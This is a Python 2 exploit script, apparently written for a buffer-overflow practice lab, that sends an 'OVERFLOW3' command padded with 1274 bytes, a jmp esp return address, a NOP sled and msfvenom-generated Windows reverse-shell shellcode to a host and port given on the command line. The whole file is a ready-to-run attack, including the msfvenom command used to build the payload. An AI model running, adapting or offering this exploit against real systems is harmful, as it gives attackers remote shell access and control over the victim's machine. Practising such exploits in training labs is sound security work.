#!/usr/bin/env python2

import socket
import sys
import logging

offset=1274

# address of jmp esp
jmp_esp="\x05\x12\x50\x62"

# NOP
nop="\x90"*20

# shellcode created with
# msfvenom -p windows/shell_reverse_tcp  LHOST=127.0.0.1 LPORT=5555 -f python  -b '\x00\x11\x40\x5F\xb8\xee' -v shellcode
shellcode =  b""
shellcode += b"\xfc\xbb\x1f\x9e\x17\xfc\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\xe3\x76\x95\xfc\x1b\x87\xfa\x75"
shellcode += b"\xfe\xb6\x3a\xe1\x8b\xe9\x8a\x61\xd9\x05\x60"
shellcode += b"\x27\xc9\x9e\x04\xe0\xfe\x17\xa2\xd6\x31\xa7"
shellcode += b"\x9f\x2b\x50\x2b\xe2\x7f\xb2\x12\x2d\x72\xb3"
shellcode += b"\x53\x50\x7f\xe1\x0c\x1e\xd2\x15\x38\x6a\xef"
shellcode += b"\x9e\x72\x7a\x77\x43\xc2\x7d\x56\xd2\x58\x24"
shellcode += b"\x78\xd5\x8d\x5c\x31\xcd\xd2\x59\x8b\x66\x20"
shellcode += b"\x15\x0a\xae\x78\xd6\xa1\x8f\xb4\x25\xbb\xc8"
shellcode += b"\x73\xd6\xce\x20\x80\x6b\xc9\xf7\xfa\xb7\x5c"
shellcode += b"\xe3\x5d\x33\xc6\xcf\x5c\x90\x91\x84\x53\x5d"
shellcode += b"\xd5\xc2\x77\x60\x3a\x79\x83\xe9\xbd\xad\x05"
shellcode += b"\xa9\x99\x69\x4d\x69\x83\x28\x2b\xdc\xbc\x2a"
shellcode += b"\x94\x81\x18\x21\x39\xd5\x10\x68\x56\x1a\x19"
shellcode += b"\x92\xa6\x34\x2a\xe1\x94\x9b\x80\x6d\x95\x54"
shellcode += b"\x0f\x6a\xda\x4e\xf7\xe4\x25\x71\x08\x2d\xe2"
shellcode += b"\x25\x58\x45\xc3\x45\x33\x95\xec\x93\x94\xc5"
shellcode += b"\x42\x4c\x55\xb5\x22\x3c\x3d\xdf\xac\x63\x5d"
shellcode += b"\xe0\x66\x0c\xf4\x1b\xe1\x4c\x09\x23\xf0\xda"
shellcode += b"\x0b\x23\xe7\xa9\x85\xc5\x6d\xde\xc3\x5e\x1a"
shellcode += b"\x47\x4e\x14\xbb\x88\x44\x51\xfb\x03\x6b\xa6"
shellcode += b"\xb2\xe3\x06\xb4\x23\x04\x5d\xe6\xe2\x1b\x4b"
shellcode += b"\x8e\x69\x89\x10\x4e\xe7\xb2\x8e\x19\xa0\x05"
shellcode += b"\xc7\xcf\x5c\x3f\x71\xed\x9c\xd9\xba\xb5\x7a"
shellcode += b"\x1a\x44\x34\x0e\x26\x62\x26\xd6\xa7\x2e\x12"
shellcode += b"\x86\xf1\xf8\xcc\x60\xa8\x4a\xa6\x3a\x07\x05"
shellcode += b"\x2e\xba\x6b\x96\x28\xc3\xa1\x60\xd4\x72\x1c"
shellcode += b"\x35\xeb\xbb\xc8\xb1\x94\xa1\x68\x3d\x4f\x62"
shellcode += b"\x98\x74\xcd\xc3\x31\xd1\x84\x51\x5c\xe2\x73"
shellcode += b"\x95\x59\x61\x71\x66\x9e\x79\xf0\x63\xda\x3d"
shellcode += b"\xe9\x19\x73\xa8\x0d\x8d\x74\xf9\x0d\x31\x8b"
shellcode += b"\x02"
# Now compose the payload

buf ="OVERFLOW3 "

# Otherwise fill the buffer with junk until reaching the overflow
buf+="A"*offset

buf += jmp_esp
buf += nop
buf += shellcode
# Finally linefeed to send the buffer
buf += '\r\n'

if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)
    
print s.recv(1024)
s.send(buf)
print s.recv(1024)